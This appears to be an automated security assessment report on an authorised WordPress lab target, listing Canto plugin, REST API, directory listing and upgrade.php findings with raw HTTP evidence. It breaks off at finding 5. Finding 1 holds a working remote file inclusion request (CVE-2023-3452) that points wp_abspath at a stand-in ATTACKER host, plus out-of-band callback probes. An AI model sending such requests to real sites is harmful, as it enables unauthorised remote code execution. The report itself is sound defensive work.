# VERDICT Security Assessment Report

## Contents

- [Assessment Information](#assessment-information)
- [Scope](#scope)
- [Summary](#summary)
- [Findings](#findings)
    - [1. CRITICAL — vulnerable-component Outdated Canto plugin 3.0.4 — CVE-2023-3452 unauthenticated RFI → RCE](#finding-1)
    - [2. MEDIUM — info-disclosure WP REST API media endpoint exposes unattached plugin ZIP and internal hostname to unauthenticated users](#finding-2)
    - [3. MEDIUM — misconfig Apache directory listing enabled on /wp-content/uploads](#finding-3)
    - [4. MEDIUM — auth-bypass WordPress DB Upgrade Wizard Accessible Without Authentication](#finding-4)
    - [5. LOW — info-disclosure Unauthenticated WordPress REST API username enumeration](#finding-5)
    - [6. LOW — info-disclosure WordPress Version and Admin Username Disclosed via RSS Feed](#finding-6)
    - [7. LOW — info-disclosure Apache server version disclosed in 404 error pages](#finding-7)
    - [8. LOW — info-disclosure Exposed WordPress default file: /readme.html](#finding-8)
    - [9. LOW — misconfig Directory Listing Enabled on Canto Plugin Source Directory](#finding-9)
    - [10. INFO — info-disclosure WP REST API posts endpoint leaks admin login username via _embed=author](#finding-10)
- [Suspected (needs manual verification)](#suspected-needs-manual-verification)
    - [11. CRITICAL — vulnerable-component Canto WordPress Plugin 3.0.4 — CVE-2023-3452 Unauthenticated SSRF (Known Vulnerable Version)](#finding-11)
    - [12. HIGH — vulnerable-component Outdated Apache httpd 2.4.41 — CVE-2021-40438 mod_proxy SSRF / CVE-2023-25690 request smuggling](#finding-12)
    - [13. MEDIUM — auth-bypass wp-abilities REST API Run Endpoint Bypasses Authentication (Missing Auth Check)](#finding-13)
    - [14. LOW — info-disclosure WordPress username enumeration via wp-login.php error messages](#finding-14)
    - [15. LOW — misconfig wp-cron.php publicly accessible without authentication](#finding-15)

## Assessment Information

| | |
|---|---|
| Assessment ID | `a-mr0scmqd-5e637b` |
| Target | http://target.local:32812/ |
| Started | 2026-06-30T15:12:32.010Z |
| Generated | 2026-07-02T00:00:00.000Z |
| Phase | report |
| Screens | 37 mapped · 37 scanned · 0 remaining |
| Hypotheses | 0 (0 confirmed) |
| Findings | 10 |
| Tooling | VERDICT |

## Scope

- **In-scope hosts**: `target.local:32812`
- **Out-of-scope hosts**: —
- **In-scope paths**: `/`
- **Out-of-scope paths**: —
- **Rate**: 30 req/min, max 2 concurrent

## Summary

10 finding(s): 1 critical, 3 medium, 5 low, 1 info

_Plus 5 suspected lead(s) needing manual verification — listed separately below, NOT counted above._

## Findings

<a id="finding-1"></a>

### 1. [CRITICAL] [vulnerable-component] Outdated Canto plugin 3.0.4 — CVE-2023-3452 unauthenticated RFI → RCE

- Screen: `(cross-screen)`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

Canto plugin 3.0.4 (readme.txt Stable tag: 3.0.4) is affected by CVE-2023-3452 (Remote File Inclusion via unvalidated `wp_abspath` in includes/lib/detail.php, get.php, tree.php → unauthenticated RCE when allow_url_include is on, otherwise LFI), and the blind-SSRF cluster CVE-2023-2779 / CVE-2023-3192 / CVE-2023-2832 (unauthenticated server-side request forgery via the Canto API-proxy parameters). Exploit class: remote/local file inclusion → RCE (critical), plus SSRF. Confirmed file presence: detail.php/get.php/tree.php each return HTTP 500 (not 404) unauthenticated. This is a version-based match; an OOB inclusion PoC is being attempted to confirm reachability of the outbound fetch.

[+] Also observed as "Canto plugin 3.0.4 — CVE-2023-3452 unauthenticated Remote File Inclusion (OOB-confirmed)".

**Reproduction**

```
1. GET /wp-content/plugins/canto/readme.txt → "Stable tag: 3.0.4" (ev-mr0vmiy6-8b). 2. GET /wp-content/plugins/canto/includes/lib/detail.php → HTTP 500 (sink file present; ev-mr0vop66-8i). 3. PoC (CVE-2023-3452): GET /wp-content/plugins/canto/includes/lib/detail.php?subdomain=x&wp_abspath=http://ATTACKER/ causes require_once('http://ATTACKER//wp-load.php') → remote code inclusion.
```

**Evidence**

- Evidence `ev-mr0vmiy6-8b` — `artifacts/_/ev-mr0vmiy6-8b/`

Request:

```http
GET /wp-content/plugins/canto/readme.txt HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
accept-ranges: bytes
connection: Keep-Alive
content-length: 5606
content-type: text/plain
date: Tue, 30 Jun 2026 16:44:12 GMT
etag: "15e6-61b1f66afd740-gzip"
keep-alive: timeout=5, max=99
last-modified: Tue, 18 Jun 2024 00:45:41 GMT
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

=== Canto ===
Contributors: Canto Inc, ianthekid, flightjim
Tags: digital asset management, brand management, cloud storage, DAM, file storage, image management, photo library, Canto
Requires at least: 5.0
Tested up to: 6.1
Stable tag: 3.0.4
License: GPLv2 or later
License URI: http://www.gnu.org/licenses/gpl-2.0.html

Easily find and publish your creative assets directly to wordpress without having to search through emails or folders, using digital asset management by Canto.

== Description ==

Simplify collaboration with your creative team by publishing photos, images, and other web-safe media from Canto directly to your WordPress website.
Instead of sending files back and forth, browse or search your Canto library directly in WordPress. You can search for text within file names, descriptions, comments, keywords, tags, or even the name of the person who uploaded the file to Canto.
Once you click to insert the image, it will save automatically to your WordPress Media Library.
Don’t have a Canto account? <a href="https://www.canto.com/signup/?utm_source=wordpress&utm_medium=plugin&utm_campaign=wordpress">Start a free trial</a> today!

== Installation ==

Installing Canto wordpress plugin can be done either by searching for "Canto" via the "Plugins > Add New" screen in your WordPress dashboard, or by using the following steps:

1. Download the plugin via WordPress.org
2. Upload the ZIP file through the 'Plugins > Add New > Upload' screen in your WordPress dashboard
3. Activate the plugin through the 'Plugins' menu in WordPress

Configure and authorize your account under "Settings > Canto" left nav menu. Click "Connect" and enter in your account credentials. You will be automatically redirected back to WordPress.

All set, enjoy!

== Screenshots ==

1. Find media assets quickly with Canto digital asset management
2. Insert into Post directly from our CDN
3. Inserts a native Gutenberg block with customizable options and formatting
4. Canto block under Common Blocks
5. Plugin settings include duplicate checking and automatic updates for assets imported in WordPress

== Frequently Asked Questions ==

= Canto Help =

For help installing or using the plugin, refer to <a href="https://cantodam.freshdesk.com/">Canto Help</a>

= Can I use this plugin without a Canto account? =

Unfortunately not. However, you are welcome to sign up today for free! <a href="https://www.canto.com/signup/?utm_source=wordpress&utm_medium=plugin&utm_campaign=wordpress">Start free trial</a>

= How do I authorize my account? =

We recommend you to connect to your Canto account using an administrator account.

== Changelog ==
= 3.0.4 =
* 2023-1-11
* Bug fixes and improvements

= 3.0.3 =
* 2023-1-3
* Bug fixes and improvements

= 3.0.2 =
* 2022-12-29
* Bug fixes and improvements

= 3.0.1 =
* 2022-12-20
* Bug fixes and improvements

= 3.0.0 =
* 2022-11-17
* This version of the plugin supports Wordpress v6.

= 2.1.2 =
* 2022-9-26
* Minor bug fixes

= 2.1.1.1 =
* 2022-5-13
* Minor bug fixes

= 2.1.1 =
* 2022-2-23
* Minor bug fixes

= 2.0.10 =
* 2022-1-26
* Minor bug fixes

= 2.0.9 =
* 2021-10-27
* Minor bug fixes
* Performance improvements

= 2.0.8 =
* 2021-09-20
* FIX: Modified some styles that may conflict with other plugins.
* FIX: Fixed the problem that the domain name cannot be selected after the login fails.
* FIX: Improved performance.

= 2.0.7 =
* 2021-08-03
* FIX: The album is not loaded when clicked.

= 2.0.6 =
* 2021-05-27
* FIX: WordPress plugin not working on Safari and Firefox.
* FIX: Other problems.

= 2.0.5 =
* 2021-05-19
* FIX: The problem of not being able to log off.

= 2.0.4 =
* 2021-05-17
* FIX: Fixed some security issues.
* FIX: The problem cannot insert picture without modification date.

= 2.0.3 =
* 2021-04-28
* FIX: Fixed the style conflict issue that caused the button to fail.
* FIX: Fixed the problem that pictures cannot be inserted normally.
* FIX: Fixed some security issues.
* FIX: Other problems.

= 2.0.2 =
* 2021-02-07
* FIX: Fixed the issue about login.

= 2.0.1 =
* 2021-01-30
* FIX: Fixed the secrity issue for the full review.

= 2.0.0 =
* 2021-01-30
* FIX: Fixed all secrity issue for the full review.


= 1.9.0 =
* 2020-12-14
* FIX: Fixed secrity issue for the full review.

= 1.8.0 =
* 2020-11-26
* FIX: Fixed issue about cannot login within .global.

= 1.7.0 =
* 2020-11-17
* FIX: Fixed issue about cannot insert image in Firefox.

= 1.6.0 =
* 2020-9-29
* FIX: Fixed issue about token expired.

= 1.5.0 =
* 2020-8-20
* FIX: Fixed issue of treeview for global env.

= 1.4.0 =
* 2019-10-10
* FIX: The tree structure data is too large to be rendered. Now load the first layer for the first time.

= 1.3.0 =
* 2019-03-06
* NEW: Gutenberg block compatibility. Canto block created to import assets into Gutenberg with native block types based on file type

= 1.2.1 =
* 2018-11-07
* FIX: Edge browser compatibility for CSS and JS loading issues

= 1.2.0 =
* 2018-10-01
* FIX: Added API domain selection for legacy and canto.global accounts
* FIX: Divi theme compatibility for custom image sizes

= 1.1.0 =
* 2018-06-09
* NEW: Added icon for non-image files. File name appears when hovering over item

= 1.0.0 =
* 2018-06-08
* Merging formerly known as "Flight by Canto" as a Canto Wordpress plugin

== Upgrade Notice ==

= 1.4.0 =
* 2019-10-10
* FIX: The tree structure data is too large to be rendered. Now load the first layer for the first time.
```

- Evidence `ev-mr0vpn2p-8l` — `artifacts/_/ev-mr0vpn2p-8l/`

Request:

```http
GET /wp-content/plugins/canto/includes/lib/detail.php?subdomain=x&wp_abspath=http://verdict-oob-noref-929lfztm.invalid HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 500
connection: close
content-length: 0
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:46:37 GMT
server: Apache/2.4.41 (Ubuntu)

[VERDICT-OOB] control: benign host, no callback expected
```

- Evidence `ev-mr0vprur-8n` — `artifacts/_/ev-mr0vprur-8n/`

Request:

```http
GET /wp-content/plugins/canto/includes/lib/detail.php?subdomain=x&wp_abspath=http://929lfztm9902q8t91etvp1fl6cc69uy.oastify.com HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 500
connection: close
content-length: 54
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:46:43 GMT
server: Apache/2.4.41 (Ubuntu)

[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=929lfztm9902q8t91etvp1fl6cc69uy.oastify.com payload_id=929lfztm9902q8t91etvp1fl6cc69uy interactions=[DNS@2026-06-30T16:46:37.995Z from 27.80.249.87; DNS@2026-06-30T16:46:38.000Z from 27.80.249.86; HTTP@2026-06-30T16:46:38.666Z from 27.83.152.211] [read#1]
```

- Evidence `ev-mr0vpsju-8o` — `artifacts/_/ev-mr0vpsju-8o/`

Request:

```http
GET /wp-content/plugins/canto/includes/lib/detail.php?subdomain=x&wp_abspath=http://929lfztm9902q8t91etvp1fl6cc69uy.oastify.com HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 500
connection: close
content-length: 54
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:46:44 GMT
server: Apache/2.4.41 (Ubuntu)

[VERDICT-OOB] OUT-OF-BAND CALLBACK CONFIRMED — the target server issued an external DNS/DNS/HTTP request to our unique Burp Collaborator host, which proves a blind out-of-band vulnerability (SSRF / XXE / blind SQLi / RCE depending on the sink). collaborator_host=929lfztm9902q8t91etvp1fl6cc69uy.oastify.com payload_id=929lfztm9902q8t91etvp1fl6cc69uy interactions=[DNS@2026-06-30T16:46:37.995Z from 27.80.249.87; DNS@2026-06-30T16:46:38.000Z from 27.80.249.86; HTTP@2026-06-30T16:46:38.666Z from 27.83.152.211] [read#2]
```

<a id="finding-2"></a>

### 2. [MEDIUM] [info-disclosure] WP REST API media endpoint exposes unattached plugin ZIP and internal hostname to unauthenticated users

- Screen: `s-0021`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

The WP REST API media endpoint is accessible without authentication and returns the full media library including unattached items (`post: null`). Media item id=67 exposes `canto.3.0.4.zip` — a 1.3 MB plugin ZIP archive uploaded to `/wp-content/uploads/2024/06/` — with a direct public download URL. This reveals the installed plugin name and version to unauthenticated attackers and provides a copy of the plugin code for offline vulnerability research. Additionally, the `guid.rendered` field discloses an internal hostname (`localhost:32816`) distinct from the public-facing host, leaking internal network topology.

**Reproduction**

```
1. GET http://target.local:32812/index.php/wp-json/wp/v2/media/67 with no authentication
2. Response HTTP 200 returns full metadata for the unattached Canto plugin ZIP: mime_type=application/zip, post=null (unattached), source_url=http://target.local:32812/wp-content/uploads/2024/06/canto.3.0.4.zip, filesize=1346710, guid.rendered leaking internal localhost:32816
3. Negative control: GET /index.php/wp-json/wp/v2/media/99999 → 404 rest_post_invalid_id, confirming the API is not a catch-all
```

**Evidence**

- Evidence `ev-mr0uc2q1-47` — `artifacts/s-0021/ev-mr0uc2q1-47/`

Request:

```http
GET /index.php/wp-json/wp/v2/media/99999 HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 404
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
connection: Keep-Alive
content-length: 82
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 16:08:04 GMT
keep-alive: timeout=5, max=100
link: <http://target.local:32812/index.php/wp-json/>; rel="https://api.w.org/"
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex

{"code":"rest_post_invalid_id","message":"Invalid post ID.","data":{"status":404}}
```

- Evidence `ev-mr0uc393-48` — `artifacts/s-0021/ev-mr0uc393-48/`

Request:

```http
GET /index.php/wp-json/wp/v2/media/67 HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
allow: GET
connection: Keep-Alive
content-length: 1588
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 16:08:05 GMT
keep-alive: timeout=5, max=99
link: <http://target.local:32812/canto-3-0-4/>; rel="alternate"; type=text/html
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex

{"id":67,"date":"2024-06-21T01:52:33","date_gmt":"2024-06-21T01:52:33","guid":{"rendered":"http:\/\/localhost:32816\/wp-content\/uploads\/2024\/06\/canto.3.0.4.zip"},"modified":"2024-06-21T01:52:33","modified_gmt":"2024-06-21T01:52:33","slug":"canto-3-0-4","status":"inherit","type":"attachment","link":"http:\/\/target.local:32812\/canto-3-0-4\/","title":{"rendered":"canto.3.0.4"},"author":1,"featured_media":0,"comment_status":"","ping_status":"closed","template":"","meta":[],"class_list":["post-67","attachment","type-attachment","status-inherit","hentry"],"description":{"rendered":"<p class=\"attachment\"><a href='http:\/\/target.local:32812\/wp-content\/uploads\/2024\/06\/canto.3.0.4.zip'>canto.3.0.4<\/a><\/p>\n"},"caption":{"rendered":"<p>canto.3.0.4<\/p>\n"},"alt_text":"","media_type":"file","mime_type":"application\/zip","media_details":{"filesize":1346710,"sizes":{}},"post":null,"source_url":"http:\/\/target.local:32812\/wp-content\/uploads\/2024\/06\/canto.3.0.4.zip","filename":"canto.3.0.4.zip","filesize":1346710,"_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media\/67","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media"}],"about":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/types\/attachment"}],"author":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/comments?post=67"}]}}
```

- Evidence `ev-mr0ucyuz-49` — `artifacts/s-0021/ev-mr0ucyuz-49/`

Request:

```http
GET /index.php/wp-json/wp/v2/media/67 HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
access-control-allow-headers: Authorization, X-WP-Nonce, Content-Disposition, Content-MD5, Content-Type
access-control-expose-headers: X-WP-Total, X-WP-TotalPages, Link
allow: GET
connection: Keep-Alive
content-length: 1588
content-type: application/json; charset=UTF-8
date: Tue, 30 Jun 2026 16:08:46 GMT
keep-alive: timeout=5, max=100
link: <http://target.local:32812/canto-3-0-4/>; rel="alternate"; type=text/html
server: Apache/2.4.41 (Ubuntu)
vary: Origin
x-content-type-options: nosniff
x-robots-tag: noindex

{"id":67,"date":"2024-06-21T01:52:33","date_gmt":"2024-06-21T01:52:33","guid":{"rendered":"http:\/\/localhost:32816\/wp-content\/uploads\/2024\/06\/canto.3.0.4.zip"},"modified":"2024-06-21T01:52:33","modified_gmt":"2024-06-21T01:52:33","slug":"canto-3-0-4","status":"inherit","type":"attachment","link":"http:\/\/target.local:32812\/canto-3-0-4\/","title":{"rendered":"canto.3.0.4"},"author":1,"featured_media":0,"comment_status":"","ping_status":"closed","template":"","meta":[],"class_list":["post-67","attachment","type-attachment","status-inherit","hentry"],"description":{"rendered":"<p class=\"attachment\"><a href='http:\/\/target.local:32812\/wp-content\/uploads\/2024\/06\/canto.3.0.4.zip'>canto.3.0.4<\/a><\/p>\n"},"caption":{"rendered":"<p>canto.3.0.4<\/p>\n"},"alt_text":"","media_type":"file","mime_type":"application\/zip","media_details":{"filesize":1346710,"sizes":{}},"post":null,"source_url":"http:\/\/target.local:32812\/wp-content\/uploads\/2024\/06\/canto.3.0.4.zip","filename":"canto.3.0.4.zip","filesize":1346710,"_links":{"self":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media\/67","targetHints":{"allow":["GET"]}}],"collection":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/media"}],"about":[{"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/types\/attachment"}],"author":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/users\/1"}],"replies":[{"embeddable":true,"href":"http:\/\/target.local:32812\/index.php\/wp-json\/wp\/v2\/comments?post=67"}]}}
```

<a id="finding-3"></a>

### 3. [MEDIUM] [misconfig] Apache directory listing enabled on /wp-content/uploads

- Screen: `s-0023`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

Apache's `Options Indexes` is active under `/wp-content/uploads/`. Any unauthenticated visitor can enumerate the full tree of uploaded files (subfolders by year/month, and the files inside them) by requesting the directory URL. The listing is recursively available: `/wp-content/uploads/2024/06/` and equivalent paths all render an Apache-generated index. This exposes the internal file/media structure to attackers, aids targeted requests for sensitive uploaded documents, and trivially maps the content graph. Contrast: `/wp-admin/` correctly redirects unauthenticated requests to the login page — the uploads exposure is a specific missing `Options -Indexes` (or missing `index.php` stub) in that directory.

**Reproduction**

```
1. Visit http://target.local:32812/wp-content/uploads/ unauthenticated.
2. Observe HTTP 200 with an Apache "Index of /wp-content/uploads" page listing 2024/ and 2026/ subdirectories.
3. Navigate into any subdirectory (e.g. /wp-content/uploads/2024/) — full recursive listing is returned.
4. Sort params (?C=N;O=D etc.) work normally, confirming full Apache autoindex functionality is active.
Remediation: add `Options -Indexes` to the uploads directory in Apache config or add an empty `index.php` file.
```

**Evidence**

- Evidence `ev-mr0ugdrq-4h` — `artifacts/s-0023/ev-mr0ugdrq-4h/`

Request:

```http
GET /wp-admin/ HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 302
cache-control: no-cache, must-revalidate, max-age=0, no-store, private
connection: Keep-Alive
content-length: 0
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:11:25 GMT
expires: Wed, 11 Jan 1984 05:00:00 GMT
keep-alive: timeout=5, max=99
location: http://target.local:32812/wp-login.php?redirect_to=http%3A%2F%2Ftarget.local%3A32812%2Fwp-admin%2F&reauth=1
server: Apache/2.4.41 (Ubuntu)
x-redirect-by: WordPress
```

- Evidence `ev-mr0ufjks-4d` — `artifacts/s-0023/ev-mr0ufjks-4d/`

Request:

```http
GET /wp-content/uploads/ HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1161
content-type: text/html;charset=UTF-8
date: Tue, 30 Jun 2026 16:10:46 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /wp-content/uploads</title>
 </head>
 <body>
<h1>Index of /wp-content/uploads</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=D">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/wp-content/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="2024/">2024/</a></td><td align="right">2024-06-17 21:55  </td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="2026/">2026/</a></td><td align="right">2026-06-30 15:12  </td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.41 (Ubuntu) Server at target.local Port 32812</address>
</body></html>
```

- Evidence `ev-mr0ufycm-4f` — `artifacts/s-0023/ev-mr0ufycm-4f/`

Request:

```http
GET /wp-content/uploads/?C=N;O=D HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
connection: Keep-Alive
content-length: 1161
content-type: text/html;charset=UTF-8
date: Tue, 30 Jun 2026 16:11:05 GMT
keep-alive: timeout=5, max=99
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<html>
 <head>
  <title>Index of /wp-content/uploads</title>
 </head>
 <body>
<h1>Index of /wp-content/uploads</h1>
  <table>
   <tr><th valign="top"><img src="/icons/blank.gif" alt="[ICO]"></th><th><a href="?C=N;O=A">Name</a></th><th><a href="?C=M;O=A">Last modified</a></th><th><a href="?C=S;O=A">Size</a></th><th><a href="?C=D;O=A">Description</a></th></tr>
   <tr><th colspan="5"><hr></th></tr>
<tr><td valign="top"><img src="/icons/back.gif" alt="[PARENTDIR]"></td><td><a href="/wp-content/">Parent Directory</a></td><td>&nbsp;</td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="2026/">2026/</a></td><td align="right">2026-06-30 15:12  </td><td align="right">  - </td><td>&nbsp;</td></tr>
<tr><td valign="top"><img src="/icons/folder.gif" alt="[DIR]"></td><td><a href="2024/">2024/</a></td><td align="right">2024-06-17 21:55  </td><td align="right">  - </td><td>&nbsp;</td></tr>
   <tr><th colspan="5"><hr></th></tr>
</table>
<address>Apache/2.4.41 (Ubuntu) Server at target.local Port 32812</address>
</body></html>
```

<a id="finding-4"></a>

### 4. [MEDIUM] [auth-bypass] WordPress DB Upgrade Wizard Accessible Without Authentication

- Screen: `s-0037`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

The WordPress database upgrade wizard at /wp-admin/upgrade.php renders its admin UI to unauthenticated requests (HTTP 200, 1359 bytes — "WordPress › Update / No Update Required"). Normal wp-admin pages correctly redirect to /wp-login.php (e.g., /wp-admin/index.php returns 302), confirming the WordPress auth gate exists but is not applied to upgrade.php. An unauthenticated attacker who reaches this endpoint during an in-progress WordPress update could trigger DB schema migration, potentially corrupting the database or forcing a partially-upgraded state. The page also confirms the running WP version (CSS references ver=7.0).

**Reproduction**

```
1. Without any session cookie or authorization header, send: GET /wp-admin/upgrade.php HTTP/1.1\n2. Observe HTTP 200 response containing the WordPress Update admin page ("No Update Required / Your WordPress database is already up to date!").\n3. Compare with GET /wp-admin/index.php (same unauthenticated request) which returns 302 → /wp-login.php, proving the auth gate exists but is skipped by upgrade.php.
```

**Evidence**

- Evidence `ev-mr0vezc6-7g` — `artifacts/s-0037/ev-mr0vezc6-7g/`

Request:

```http
GET /wp-admin/index.php HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 302
cache-control: no-cache, must-revalidate, max-age=0, no-store, private
connection: Keep-Alive
content-length: 0
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:38:20 GMT
expires: Wed, 11 Jan 1984 05:00:00 GMT
keep-alive: timeout=5, max=100
location: http://target.local:32812/wp-login.php?redirect_to=http%3A%2F%2Ftarget.local%3A32812%2Fwp-admin%2Findex.php&reauth=1
server: Apache/2.4.41 (Ubuntu)
x-redirect-by: WordPress
```

- Evidence `ev-mr0ve718-7e` — `artifacts/s-0037/ev-mr0ve718-7e/`

Request:

```http
GET /wp-admin/upgrade.php HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache, must-revalidate, max-age=0, no-store, private
connection: Keep-Alive
content-length: 1359
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:37:43 GMT
expires: Wed, 11 Jan 1984 05:00:00 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta name="robots" content="noindex,nofollow" />
	<title>WordPress &rsaquo; Update</title>
	<link rel='stylesheet' id='dashicons-css' href='http://target.local:32812/wp-includes/css/dashicons.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='buttons-css' href='http://target.local:32812/wp-includes/css/buttons.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='forms-css' href='http://target.local:32812/wp-admin/css/forms.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='l10n-css' href='http://target.local:32812/wp-admin/css/l10n.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='wp-base-styles-css' href='http://target.local:32812/wp-includes/css/dist/base-styles/admin-schemes.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='install-css' href='http://target.local:32812/wp-admin/css/install.min.css?ver=7.0' media='all' />
</head>
<body class="wp-core-ui admin-color-modern">
<p id="logo">WordPress</p>


<h1>No Update Required</h1>
<p>Your WordPress database is already up to date!</p>
<p class="step"><a class="button button-large" href="http://target.local:32812/">Continue</a></p>

	</body>
</html>
```

- Evidence `ev-mr0vef3n-7f` — `artifacts/s-0037/ev-mr0vef3n-7f/`

Request:

```http
GET /wp-admin/upgrade.php HTTP/1.1
Host: target.local:32812
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
authorization: <redacted>
```

Response:

```http
HTTP/1.1 200
cache-control: no-cache, must-revalidate, max-age=0, no-store, private
connection: Keep-Alive
content-length: 1359
content-type: text/html; charset=UTF-8
date: Tue, 30 Jun 2026 16:37:53 GMT
expires: Wed, 11 Jan 1984 05:00:00 GMT
keep-alive: timeout=5, max=100
server: Apache/2.4.41 (Ubuntu)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en-US">
<head>
	<meta name="viewport" content="width=device-width, initial-scale=1.0" />
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
	<meta name="robots" content="noindex,nofollow" />
	<title>WordPress &rsaquo; Update</title>
	<link rel='stylesheet' id='dashicons-css' href='http://target.local:32812/wp-includes/css/dashicons.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='buttons-css' href='http://target.local:32812/wp-includes/css/buttons.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='forms-css' href='http://target.local:32812/wp-admin/css/forms.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='l10n-css' href='http://target.local:32812/wp-admin/css/l10n.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='wp-base-styles-css' href='http://target.local:32812/wp-includes/css/dist/base-styles/admin-schemes.min.css?ver=7.0' media='all' />
<link rel='stylesheet' id='install-css' href='http://target.local:32812/wp-admin/css/install.min.css?ver=7.0' media='all' />
</head>
<body class="wp-core-ui admin-color-modern">
<p id="logo">WordPress</p>


<h1>No Update Required</h1>
<p>Your WordPress database is already up to date!</p>
<p class="step"><a class="button button-large" href="http://target.local:32812/">Continue</a></p>

	</body>
</html>
```

<a id="finding-5"></a>

### 5. [LOW] [info-disclosure] Unauthenticated WordPress REST API username enumeration

- Screen: `s-0003`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32812/

